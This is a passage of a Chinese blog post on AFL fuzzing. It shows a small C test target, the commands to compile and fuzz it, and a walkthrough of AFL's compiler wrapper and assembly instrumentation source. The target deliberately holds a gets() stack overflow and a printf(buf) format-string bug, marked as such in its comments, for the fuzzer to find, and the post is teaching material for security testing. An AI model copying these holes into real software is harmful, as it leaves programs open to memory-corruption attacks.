class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;it is good!\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">gets</span>(buf);<span class="hljs-comment">//存在栈溢出漏洞</span><br>    <span class="hljs-built_in">printf</span>(buf);<span class="hljs-comment">//存在格式化字符串漏洞</span><br>    <span class="hljs-built_in">vuln</span>(buf);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">afl-gcc -g -o afl_test afl_test.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><h3 id="建立读入、输出文件夹"><a href="#建立读入、输出文件夹" class="headerlink" title="建立读入、输出文件夹"></a>建立读入、输出文件夹</h3><p>如fuzz_in,fuzz_out</p><h3 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h3><p><code>afl-fuzz -i fuzz_in -o fuzz_out ./afl_test</code><br>接下来会报错<br><code> Pipe at the beginning of &#39;core_pattern&#39;</code><br>进行设置<br><code>sudo su</code><br><code> echo core &gt;/proc/sys/kernel/core_pattern</code><br>再次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -i fuzz_in -o fuzz_out ./afl_test<br></code></pre></td></tr></table></figure><p>即可进入AFL仪表盘</p><h3 id="AFL-仪表盘"><a href="#AFL-仪表盘" class="headerlink" title="AFL 仪表盘"></a>AFL 仪表盘</h3><p><img src="/2023/02/19/Fuzzing/afl_ui.png" alt="AFL仪表盘"></p><p>关注<br><code>stage progress </code><br>若exec speed 低于600，则速度太慢<br><code> unique crashes</code><br>发现的路径数</p><h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><p><code> Ctrl+C</code><br>结束运行<br>进入fuzz_out<br>输入<code>xxd id:.........</code><br>查看结果，并分析</p><h1 id="AFL源码分析"><a href="#AFL源码分析" class="headerlink" title="AFL源码分析"></a>AFL源码分析</h1><h2 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h2><p><strong>afl-gcc.c</strong>是封装（wrapper）了gcc的一个文件<br>afl-gcc会寻找、配置环境变量以及许多配置数据。<br><strong>变量：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8*  as_path;                <span class="hljs-comment">/* Path to the AFL &#x27;as&#x27; wrapper      */</span> as的路径，接下来的函数find_as就是为了确定这个参数<br><span class="hljs-type">static</span> u8** cc_params;              <span class="hljs-comment">/* Parameters passed to the real CC  */</span><br><span class="hljs-type">static</span> u32  cc_par_cnt = <span class="hljs-number">1</span>;         <span class="hljs-comment">/* Param count, including argv0      */</span><br><span class="hljs-type">static</span> u8   be_quiet,               <span class="hljs-comment">/* Quiet mode                        */</span><br>            clang_mode;             <span class="hljs-comment">/* Invoked as afl-clang*?            */</span><br>            <br></code></pre></td></tr></table></figure><p><strong>函数  find_as(u8* argv0):</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">find_as</span><span class="hljs-params">(u8* argv0)</span> &#123;<br><br>  u8 *afl_path = getenv(<span class="hljs-string">&quot;AFL_PATH&quot;</span>); <span class="hljs-comment">//getenv()函数，直接寻找环境变量中有无目标值，有就以字符串+null形式返回，无则直接返回null</span><br>  u8 *slash, *tmp;<span class="hljs-comment">// slash 斜杠 “\”  </span><br><br>  <span class="hljs-keyword">if</span> (afl_path) &#123;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/as&quot;</span>, afl_path);<span class="hljs-comment">//将找到的路径与/as拼接，尝试找到目标程序</span><br><br>    <span class="hljs-keyword">if</span> (!access(tmp, X_OK)) &#123; <span class="hljs-comment">// access()函数会尝试运行目标程序，成功返回值为0，否则返回-1，本句意为若通过环境变量找到了as，就...</span><br>      as_path = afl_path;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br><br>  &#125;<br><br>  slash = <span class="hljs-built_in">strrchr</span>(argv0, <span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-comment">//找到最后一次出现字符&#x27;/&#x27;的位置并返回之</span><br><br>  <span class="hljs-keyword">if</span> (slash) &#123;<span class="hljs-comment">//若找到&#x27;/&#x27;</span><br><br>    u8 *dir;<br><br>    *slash = <span class="hljs-number">0</span>;<br>    dir = ck_strdup(argv0);<span class="hljs-comment">//argv0是int main(int argc, char**argv)的第一个参数</span><br>    *slash = <span class="hljs-string">&#x27;/&#x27;</span>;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/afl-as&quot;</span>, dir);<span class="hljs-comment">//拼接运行时给入的地址与as</span><br><br>    <span class="hljs-keyword">if</span> (!access(tmp, X_OK)) &#123;<br>      as_path = dir;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br>    ck_free(dir);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (!access(AFL_PATH <span class="hljs-string">&quot;/as&quot;</span>, X_OK)) &#123;<br>    as_path = AFL_PATH;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);<span class="hljs-comment">//若找不到as，抛出错误</span><br> <br>&#125;<br></code></pre></td></tr></table></figure><p>即本函数是寻找assembler的过程，没找到就报错</p><p><strong>函数edit_params</strong></p><ul><li>该函数将arvg[0]中的最后’&#39;后的字符串赋给name，根据一系列判断，确定’afl-lang’ or ‘afl-lang++’ or 其他平台，如APPLE等。</li><li>即读取第一个参数，然后确定平台、方式</li><li>随后进入while循环，读取argv[1]开始的参数</li><li>若为’-B’，提示<code>&quot;-B is already set, overriding&quot;</code></li><li>若为’-integrated-as’，略过</li><li>等等</li></ul><p><strong>离开while循环后</strong><br>若为<code>clang_mode</code>，设置<code>cc_params[cc_par_cnt++] = &#39;-no-integranted-as&#39;;</code><br>如果存在环境变量 <code>AFL_HARDEN</code>，则设置<code>-fstack-protector-all</code>。且如果没有设置<code> fortify_set</code> ，追加<code>-D_FORTIFY_SOURCE=2</code></p><p>之后还要一系列参数设置<br>总而言之，该函数是为了将参数设置好，符合运行环境以及指令。</p><p><strong>main函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>) &amp;&amp; !getenv(<span class="hljs-string">&quot;AFL_QUIET&quot;</span>)) &#123;<br><br>    SAYF(cCYA <span class="hljs-string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> be_quiet = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span><br>         <span class="hljs-string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span><br>         <span class="hljs-string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span><br>         <span class="hljs-string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span><br>         <span class="hljs-string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span><br>         <span class="hljs-string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,<br>         BIN_PATH, BIN_PATH);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  find_as(argv[<span class="hljs-number">0</span>]);<br><br>  edit_params(argc, argv);<br><br>  execvp(cc_params[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span>**)cc_params);<span class="hljs-comment">//调用以上两个函数，完成配置</span><br><br>  FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="afl-as-c"><a href="#afl-as-c" class="headerlink" title="afl-as.c"></a>afl-as.c</h2><p><strong>参数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8** as_params;          <span class="hljs-comment">/* Parameters passed to the real &#x27;as&#x27;   */</span> <span class="hljs-comment">// 传给as的参数</span><br><br><span class="hljs-type">static</span> u8*  input_file;         <span class="hljs-comment">/* Originally specified input file      */</span><br><span class="hljs-type">static</span> u8*  modified_file;      <span class="hljs-comment">/* Instrumented file for the real &#x27;as&#x27;  */</span> <span class="hljs-comment">//as进行插桩的文件</span><br><br><span class="hljs-type">static</span> u8   be_quiet,           <span class="hljs-comment">/* Quiet mode (no stderr output)        */</span><br>            clang_mode,         <span class="hljs-comment">/* Running in clang mode?               */</span><br>            pass_thru,          <span class="hljs-comment">/* Just pass data through?              */</span><br>            just_version,       <span class="hljs-comment">/* Just show version?                   */</span><br>            sanitizer;          <span class="hljs-comment">/* Using ASAN / MSAN                    */</span><br><br><span class="hljs-type">static</span> u32  inst_ratio = <span class="hljs-number">100</span>,   <span class="hljs-comment">/* Instrumentation probability (%)      */</span>  <span class="hljs-comment">// 插桩覆盖率</span><br>            as_par_cnt = <span class="hljs-number">1</span>;     <span class="hljs-comment">/* Number of params to &#x27;as&#x27;             */</span><br></code></pre></td></tr></table></figure><p><strong>函数edit_params</strong><br>同afl-gcc中一致，进行参数配置</p><p><strong>函数add_instrumentation</strong><br>插桩函数，此函数负责处理输入文件，生成<code>modified_file</code>，将instrumentations插入所有适当位置。</p><ul><li><p>读取input-file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (input_file) &#123;<br><br>    inf = fopen(input_file, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!inf) PFATAL(<span class="hljs-string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);<br><br>  &#125; <span class="hljs-keyword">else</span> inf = <span class="hljs-built_in">stdin</span>;<br>  <span class="hljs-comment">//若打开失败，报错无法读取，或直接从stdin读取</span><br></code></pre></td></tr></table></figure></li><li><p>写入modified-file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="hljs-number">0600</span>);<br><br><span class="hljs-keyword">if</span> (outfd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);<br><br>outf = fdopen(outfd, <span class="hljs-string">&quot;w&quot;</span>);<br><br><span class="hljs-keyword">if</span> (!outf) PFATAL(<span class="hljs-string">&quot;fdopen() failed&quot;</span>); <br></code></pre></td></tr></table></figure><p>接下来看看下一段</p></li></ul><p><strong>真正有趣的地方，插桩逻辑开始之处</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* All right, this is where the actual fun begins. For one, we only want to</span><br><span class="hljs-comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span><br><span class="hljs-comment">       files - and let&#x27;s set instr_ok accordingly. */</span><br><br>    <span class="hljs-keyword">if</span> (line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br><br>      <span class="hljs-comment">/* OpenBSD puts jump tables directly inline with the code, which is</span><br><span class="hljs-comment">         a bit annoying. They use a specific format of p2align directives</span><br><span class="hljs-comment">         around them, so we use that as a signal. */</span><br><br>      <span class="hljs-keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;p2align &quot;</span>, <span class="hljs-number">8</span>) &amp;&amp;<br>          <span class="hljs-built_in">isdigit</span>(line[<span class="hljs-number">10</span>]) &amp;&amp; line[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;\n&#x27;</span>) skip_next_label = <span class="hljs-number">1</span>;<br><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;text\n&quot;</span>, <span class="hljs-number">5</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t.text&quot;</span>, <span class="hljs-number">13</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t__TEXT,__text&quot;</span>, <span class="hljs-number">21</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section __TEXT,__text&quot;</span>, <span class="hljs-number">21</span>)) &#123;<br>        instr_ok = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">continue</span>; <br>      &#125;<br><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t&quot;</span>, <span class="hljs-number">8</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section &quot;</span>, <span class="hljs-number">8</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;bss\n&quot;</span>, <span class="hljs-number">4</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;data\n&quot;</span>, <span class="hljs-number">5</span>)) &#123;<br>        instr_ok = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>由于插桩只向<code>.text</code>部分插入，故需要进行该部分的匹配（确认是否在此部分中）</li><li>即匹配<code>text   section\t.text </code>等四个str，若匹配成功，<code>continue</code>跳出，进行下一次循环</li><li>若匹配失败，再与非.text字段进行匹配，若匹配成功，证明不在.text段内，也<code>continue</code>跳出</li><li>上述两种情况，参数<code>instr_ok</code>分别为1、0，即代表是否位于理想字段内。</li></ul><p>后续进行三个判定，来确认一些参数的值。</p><ul><li>插桩时关注的重点是<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">^main:      - function entry point (always <span class="hljs-keyword">instrumented)</span><br><span class="hljs-keyword"></span>         ^.L0:       - GCC <span class="hljs-keyword">branch </span>label<br>         ^.<span class="hljs-keyword">LBB0_0: </span>  - clang <span class="hljs-keyword">branch </span>label (<span class="hljs-keyword">but </span>only in clang mode)<br>         ^\tjnz foo  - conditional <span class="hljs-keyword">branches</span><br></code></pre></td></tr></table></figure>故检测形如<code>\tj[^m]</code>的格式的命令，即为条件跳转命令。当随机数小于覆盖率时，会将<code>trampoline_fmt_64</code>写入<code>R(MAP_SIZE)</code>位进入文件，随后插桩计数<code>ins_lines</code>加一，continue跳出。<br>对于clang，APPLE是相似的过程，即适用于不同编译系统</li></ul><p>最后回到while循环的开始处<br>从刚刚就一直困扰我的问题——判断条件合适（位于.text中），却跳转进下一个循环是为什么，得到了解决。<br>可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;<br>        instrument_next &amp;&amp; line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\t&#x27;</span> &amp;&amp; <span class="hljs-built_in">isalpha</span>(line[<span class="hljs-number">1</span>])) &#123;<br><br>      <span class="hljs-built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,<br>              R(MAP_SIZE));<br><br>      instrument_next = <span class="hljs-number">0</span>;<br>      ins_lines++;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>循环开始时便进行了一次条件检测，当合适时，进行插桩，再重新布置参数，使得不漏一处。</p><p><strong>至此，插桩的逻辑基本完成。</strong><br><strong>总结：插桩是通过遍历目标文件行，寻找敏感处并进行标记，于本次循环或下次循环进行插桩，然后再去寻找下处可插处，直至lines遍历完毕</strong></p><h2 id="afl-as-h"><a href="#afl-as-h" class="headerlink" title="afl-as.h"></a>afl-as.h</h2><p>上面读了两个文件中描述了插桩过程的逻辑，其中真正的插桩，<code>trampoline_fmt_64/32</code>是关键所在（插入了什么内容？）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs trampoline_fmt_64/32```定义于```afl-as.h```中，以下是其代码">```c<br>static const u8* trampoline_fmt_32 =<br><br>  &quot;\n&quot;<br>  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;<br>  &quot;\n&quot;<br>  &quot;.align 4\n&quot;<br>  &quot;\n&quot;<br>  &quot;leal -16(%%esp), %%esp\n&quot;<br>  &quot;movl %%edi,  0(%%esp)\n&quot;<br>  &quot;movl %%edx,  4(%%esp)\n&quot;<br>  &quot;movl %%ecx,  8(%%esp)\n&quot;<br>  &quot;movl %%eax, 12(%%esp)\n&quot;<br>  &quot;movl $0x%08x, %%ecx\n&quot;<br>  &quot;call __afl_maybe_log\n&quot;<br>  &quot;movl 12(%%esp), %%eax\n&quot;<br>  &quot;movl  8(%%esp), %%ecx\n&quot;<br>  &quot;movl  4(%%esp), %%edx\n&quot;<br>  &quot;movl  0(%%esp), %%edi\n&quot;<br>  &quot;leal 16(%%esp), %%esp\n&quot;<br>  &quot;\n&quot;<br>  &quot;/* --- END --- */\n&quot;<br>  &quot;\n&quot;;<br><br>static const u8* trampoline_fmt_64 =<br><br>  &quot;\n&quot;<br>  &quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;<br>  &quot;\n&quot;<br>  &quot;.align 4\n&quot;<br>  &quot;\n&quot;<br>  &quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;<br>  &quot;movq %%rdx,  0(%%rsp)\n&quot; <br>  &quot;movq %%rcx,  8(%%rsp)\n&quot;<br>  &quot;movq %%rax, 16(%%rsp)\n&quot; // save rdx rcx rax <br>  &quot;movq $0x%08x, %%rcx\n&quot; // set what will be print by fprintf() in rcx<br>  &quot;call __afl_maybe_log\n&quot;<br>  &quot;movq 16(%%rsp), %%rax\n&quot;<br>  &quot;movq  8(%%rsp), %%rcx\n&quot;<br>  &quot;movq  0(%%rsp), %%rdx\n&quot; // 恢复寄存器<br>  &quot;leaq (128+24)(%%rsp), %%rsp\n&quot;<br>  &quot;\n&quot;<br>  &quot;/* --- END --- */\n&quot;<br>  &quot;\n&quot;;<br></code></pre></td></tr></table></figure><p>其中，真正的核心是<code>call __afl_maybe_log</code><br>这个指令来自<code>main_payload_64/32</code><br><strong>__afl_maybe_log</strong><br>其中<code>__afl_maybe_log</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;__afl_maybe_log:\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  lahf\n&quot;</span><br>  <span class="hljs-string">&quot;  seto  %al\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span><span class="hljs-comment">//检查共享内存是否进行了设置</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  testq %rdx, %rdx\n&quot;</span> <span class="hljs-comment">// 判断__afl_area_ptr是否为null</span><br>  <span class="hljs-string">&quot;  je    __afl_setup\n&quot;</span> <span class="hljs-comment">// 为空则跳转</span><br></code></pre></td></tr></table></figure><p>使用<code>lahf</code>指令，加载状态标志位到<code>AH</code>，即<code>EFLAG</code>寄存器低八位复制到<code>AH</code>中，被复制的标志位包括：符号标志位（SF）、零标志位（ZF）、辅助进位标志位（AF）、奇偶标志位（PF）和进位标志位（CF），使用该指令可以方便地将标志位副本保存在变量中；<br>然后，使用<code>seto %al</code>溢出置位，即<strong>“如果溢出，则%al设置为1”</strong></p><p><strong>__afl_setup</strong><br>用于初始化<code>__afl_area_ptr</code>，且只在运行到第一个桩时进行本次初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;__afl_setup:\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;</span><br>  <span class="hljs-string">&quot;  jne __afl_return\n&quot;</span><span class="hljs-comment">//先检查是否为0，不是则直接返回，“防止预先可预见的失败”</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Check out if we have a global pointer on file. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  testq %rdx, %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  je    __afl_setup_first\n&quot;</span> <span class="hljs-comment">// 如果global pointer也为空，进行初次建立</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;</span><span class="hljs-comment">//否则直接赋值给area ptr，然后进入store</span><br>  <span class="hljs-string">&quot;  jmp  __afl_store\n&quot;</span> <br></code></pre></td></tr></table></figure><p><strong>__afl-setup_first</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 